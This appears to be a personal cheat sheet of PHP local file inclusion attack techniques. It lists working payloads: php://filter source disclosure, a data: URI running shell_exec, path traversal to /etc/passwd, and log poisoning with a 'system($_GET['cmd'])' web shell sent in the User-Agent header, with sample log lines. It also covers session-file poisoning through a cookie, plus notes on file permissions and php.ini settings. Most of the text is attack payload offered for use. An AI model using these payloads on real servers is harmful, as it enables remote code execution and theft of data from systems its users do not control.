## 1
```shell
# php_base64_LFI:
http://xxxxxxxx?page=php://filter/convert.base64-encode/resource=xxxxx.php
http://xxxxxxxx?page=data:text/plain,<?php echo shell_exec("dir") ?> # allow_url_include=on in php.ini
```
LFI:
/aaa/bbb/ccc/../../../../../etc/passwd, (ccc should be a directory)

## LFI + apache/nginx log
1. do not use double quotes`($_GET['cmd'])`, or it will break the machine

```shell
# php RCE in apache/nginx log:
# Windows XAMPP: c:\xampp\apache\logs\access.log
"User-Agent: <?php system($_GET['cmd']); ?>"

# logs file
"User-Agent: <?php echo 'MMM'; ?>"
127.0.0.1 - - [02/Apr/2023:20:00:51 +0530] "GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1" 500 1800 "-" "<?php echo 'MMM'; ?>"

"User-Agent: <?php echo "MMM"; ?>"
# will cause error
# apache2:
127.0.0.1- - [02/Apr/2023:20:00:59 +0530] "GET /detail.php?page=/var/log/apache2/access.log HTTP/1.1" 500 1800 "-" "<?php echo \"MMM\"; ?>"
# nginx
127.0.0.1 - - [02/Apr/2023:10:36:40 -0400] "GET / HTTP/1.1" 200 3437 "-" "<?php echo \x22MMM\x22; ?>"
```

```shell
www-data    5933    5932  0 20:30 ?        00:00:00 nginx: worker process
ls -l /proc/5933/environ
-r-------- 1 www-data www-data 0 Apr  2 20:30 environ

www-data    5742    5740  0 20:28 ?        00:00:00 /usr/sbin/apache2 -k start
ls -l /proc/5742/environ
-r-------- 1 root root 0 Apr  2 20:30 environ
```


works: php `include` function
does not work: see sample/home.php(XXE attack)

```shell
# nginx log default permission
-rw-r----- 1 www-data adm 0 Apr  2 00:00 access.log

# apache2 log default permission
-rw-r----- 1 root adm 0 Mar  5 00:00 access.log
```

## LFI + php session
```shell
# php session name: sess_<sessionID>
# php session location: /var/lib/php/sessions
# You can also use PHP's ini_get() function to find the current setting 
# <?php
#   echo ini_get('session.save_path');
# ?>
Inject via the cookie request header
Cookie: PHPSESSID=5044f664ce6697a6bcc5363d9984a9;cookie2=<?php system ($_GET['cmd']) ?>
```

## 4
By default, file_get_contents can get remote resources("http://...) while include cannot get remote resources. To enable it, set allow_url_include=1 in php.ini file